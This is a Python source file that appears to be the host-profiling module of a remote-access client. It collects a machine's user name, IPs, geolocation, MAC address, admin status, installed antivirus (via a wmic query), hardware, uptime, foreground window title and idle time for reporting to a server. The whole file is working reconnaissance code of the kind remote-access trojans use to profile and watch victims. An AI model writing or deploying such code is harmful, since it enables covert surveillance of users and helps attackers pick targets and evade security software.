'''
    Collects large amounts of client information,
    which is sent on initial connection to the
    server, but also provides interval data.

    Verified: 2020 December 30 & 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * GPUtil
        * psutil
'''

from client.helper import ClientHelper
from client.state import ClientStatic
from shared.state import Static
from client.shell import Shell

import urllib.request
import platform
import getpass
import GPUtil
import psutil
import locale
import socket
import json
import uuid
import time
import sys
import re
import os

if Static.WINDOWS:
    import ctypes.wintypes
    import ctypes


class Interval:

    if Static.WINDOWS:
        class LastInputInfo(ctypes.Structure):
            _fields_ = [('cbSize', ctypes.c_uint),
                        ('dwTime', ctypes.c_uint)]

    @staticmethod
    def collect():
        return {
            'active_window': ClientHelper.secure(Interval.__active_window),
            'idle_time': ClientHelper.secure(Interval.__idle_time),
            'resource_usage': ClientHelper.secure(Interval.__resource_usage)
        }

    @staticmethod
    def __active_window():
        if Static.WINDOWS:
            window = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(window) + 1
            buffer = ctypes.create_unicode_buffer(length)
            ctypes.windll.user32.GetWindowTextW(window, buffer, length)

            if buffer.value:
                return buffer.value
            else:
                return 'No Active Window'
        else:
            return ClientStatic.DEFAULT

    @staticmethod
    def __idle_time():
        if Static.WINDOWS:
            input_info = Interval.LastInputInfo()
            input_info.cbSize = ctypes.sizeof(input_info)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(input_info))
            millis = ctypes.windll.kernel32.GetTickCount() - input_info.dwTime
            return '{} Minutes'.format(int((millis / (1000 * 60)) % 60))
        else:
            return ClientStatic.DEFAULT

    @staticmethod
    def __resource_usage():
        return '{}/{}'.format(psutil.cpu_percent(),
                              psutil.virtual_memory().percent)


class Sysinfo:

    if Static.WINDOWS:
        __ANTIVIRUS_CMD = (r'wmic /namespace:\\root\securitycenter2 path'
                           ' antivirusproduct get displayname | more +1')
        __PC_CMD = 'wmic computersystem get model, manufacturer | more +1'

    __LOCATION_API = 'https://geolocation-db.com/json/'
    __PRIVILEGES = ('Administrator', 'User')

    def __init__(self):
        self.__uname = platform.uname()

    def collect(self):
        return {
            'operating_system': ClientHelper.secure(self.__operating_system),
            'system_locale': ClientHelper.secure(self.__system_locale),
            'system_uptime': ClientHelper.secure(self.__system_uptime),
            'build_version': ClientHelper.secure(self.__build_version),
            'mac_address': ClientHelper.secure(self.__mac_address),
            'privileges': ClientHelper.secure(self.__privileges),
            'os_version': ClientHelper.secure(self.__os_version),
            'build_name': ClientHelper.secure(self.__build_name),
            'antivirus': ClientHelper.secure(self.__antivirus),
            'username': ClientHelper.secure(self.__username),
            'local_ip': ClientHelper.secure(self.__local_ip),
            'timezone': ClientHelper.secure(self.__timezone),
            'hostname': ClientHelper.secure(self.__hostname),
            'filepath': ClientHelper.secure(self.__filepath),
            'running': ClientHelper.secure(self.__running),
            'cpu': ClientHelper.secure(self.__cpu),
            'gpu': ClientHelper.secure(self.__gpu),
            'ram': ClientHelper.secure(self.__ram),
            **self.__pc_model_manufacturer(),
            **self.__location()
        }

    def __location(self):
        try:
            response = json.loads(urllib.request.urlopen(
                                  Sysinfo.__LOCATION_API).read())

            return dict(zip((
                'external_ip',
                'country',
                'country_code',
                'region',
                'city',
                'latitude',
                'longitude',
                'zip_code'
            ), (
                str(response['IPv4']),
                str(response['country_name']),
                str(response['country_code']),
                str(response['state']),
                str(response['city']),
                str(response['latitude']),
                str(response['longitude']),
                str(response['postal']))))
        except Exception:
            return {
                'external_ip': ClientStatic.DEFAULT,
                'country': ClientStatic.DEFAULT,
                'country_code': ClientStatic.DEFAULT,
                'region': ClientStatic.DEFAULT,
                'city': ClientStatic.DEFAULT,
                'latitude': ClientStatic.DEFAULT,
                'longitude': ClientStatic.DEFAULT,
                'zip_code': ClientStatic.DEFAULT
            }

    def __build_name(self):
        return ClientStatic.BUILD_NAME

    def __build_version(self):
        return ClientStatic.BUILD_VERSION

    def __filepath(self):
        return Static.ROOT

    def __username(self):
        return self.__verify((getpass.getuser(),))

    def __cpu(self):
        return self.__verify((self.__uname.processor,))

    def __hostname(self):
        return self.__verify((self.__uname.node,))

    def __os_version(self):
        return self.__verify((self.__uname.version,))

    def __ram(self):
        return f'{round(psutil.virtual_memory().total / 1024**3)}GB'

    def __local_ip(self):
        return socket.gethostbyname(socket.gethostname())

    def __mac_address(self):
        return ':'.join(re.findall('..', f'{uuid.getnode():012x}'))

    def __system_locale(self):
        return ', '.join(locale.getdefaultlocale())

    def __timezone(self):
        return '{} Hours'.format(
            time.strftime('%z', time.gmtime()))

    def __operating_system(self):
        return self.__verify((
            self.__uname.system,
            self.__uname.release,
            self.__uname.machine,
            '64-bit' if sys.maxsize > 2**32 else '32-bit'), ' ')

    def __running(self):
        return 'Python Version {}.{}.{} {} Release'.format(
            *sys.version_info[:3], sys.version_info[3].capitalize())

    def __privileges(self):
        if Static.WINDOWS:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return Sysinfo.__PRIVILEGES[0]
            else:
                return Sysinfo.__PRIVILEGES[1]
        else:
            if os.getuid() == 0:
                return Sysinfo.__PRIVILEGES[0]
            else:
                return Sysinfo.__PRIVILEGES[1]

    def __gpu(self):
        return self.__verify([gpu.name for gpu in
                              GPUtil.getGPUs()], ', ')

    def __pc_model_manufacturer(self):
        try:
            if Static.WINDOWS:
                return dict(zip(('pc_manufacturer', 'pc_model'), Shell.run(
                            Sysinfo.__PC_CMD, True).strip().split('  ')[:2]))
            else:
                raise OSError
        except Exception:
            return {
                'pc_manufacturer': ClientStatic.DEFAULT,
                'pc_model': ClientStatic.DEFAULT
            }

    def __antivirus(self):
        if Static.WINDOWS:
            return ', '.join([av.strip() for av in Shell.run(
                Sysinfo.__ANTIVIRUS_CMD, True).strip().split('\n\n')])
        else:
            return ClientStatic.DEFAULT

    def __system_uptime(self):
        total = int(time.time() - psutil.boot_time())

        days = divmod(total, 86400)
        hours = divmod(days[1], 3600)
        minutes = divmod(hours[1], 60)
        seconds = divmod(minutes[1], 1)

        return '{} Day{} ({:02}:{:02}:{:02})'.format(
            days[0], ClientHelper.plural_int(days[0]),
            hours[0], minutes[0], seconds[0])

    def __verify(self, iterable, join_by=''):
        return join_by.join([el if el else
                             ClientStatic.DEFAULT for el in iterable])
